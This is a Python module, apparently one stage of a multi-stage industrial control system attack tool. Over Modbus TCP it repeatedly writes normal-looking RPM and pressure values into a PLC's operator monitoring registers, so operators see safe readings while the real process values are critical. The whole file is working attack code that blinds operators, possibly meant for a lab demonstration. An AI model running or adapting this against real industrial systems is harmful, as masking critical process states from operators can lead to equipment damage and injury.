import time
import threading
from pymodbus.client import ModbusTcpClient
from scripts.config import get, REGISTERS
from utils.colors import ok, err, info, warn, red, yellow, cyan, magenta, white
from utils import logger

STAGE = {
    'name': 'False Telemetry Cover',
    'key':  '5',
    'desc': 'masks real values from operator view every 2s',
}

BANNER = f"""
{magenta("  ╔══════════════════════════════════════╗")}
{magenta("  ║")} {white("STAGE 5 -- FALSE TELEMETRY COVER       ")}{magenta("║")}
{magenta("  ╚══════════════════════════════════════╝")}
"""

NORMAL   = REGISTERS['normal']
INTERVAL = 2
_stop    = threading.Event()


def _apply_cover(client):
    client.write_register(address=2, value=NORMAL['holding'][0])
    client.write_register(address=3, value=NORMAL['holding'][1])


def _loop(ip, port):
    client = ModbusTcpClient(ip, port=port)
    client.connect()
    tick = 0

    while not _stop.is_set():
        try:
            _apply_cover(client)
            tick += 1
            print(
                f"\r  {magenta('[COVER]')} tick {yellow(str(tick)):>4}  "
                f"operator sees RPM={cyan('1064')} Pressure={cyan('485')}  "
                f"real values are {red('CRITICAL')}  ",
                end='', flush=True
            )
            logger.attack(f"Cover tick {tick} -- monitor registers written with normal values")
        except Exception as e:
            print()
            print(warn(f"Reconnecting... ({e})"))
            client.close()
            client = ModbusTcpClient(ip, port=port)
            client.connect()
        time.sleep(INTERVAL)

    client.close()
    print()
    print(ok("Cover loop stopped. Operator view no longer masked."))
    logger.info("Cover loop stopped.")


def run(cfg=None):
    if cfg is None:
        cfg = get()
    ip   = cfg['target_ip']
    port = cfg['target_port']

    print(BANNER)
    print(info("Cover mode writes normal-looking values to the operator"))
    print(info("monitoring registers every 2 seconds."))
    print()
    print(info("Operators see: RPM=1064 Hz, Pressure=485 mbar"))
    print(red("  Real values : RPM=1410 Hz, Pressure=650 mbar"))
    print()
    print(info("Use stage 2 (Read PLC State) to see the mismatch live."))
    print()
    print(warn("Press Ctrl+C to stop."))
    print()

    _stop.clear()
    t = threading.Thread(target=_loop, args=(ip, port), daemon=True)
    t.start()
    logger.attack(f"Cover loop started against {ip}:{port}")

    try:
        while t.is_alive():
            time.sleep(0.3)
    except KeyboardInterrupt:
        print()
        print(info("Stopping cover..."))
        _stop.set()
        t.join()
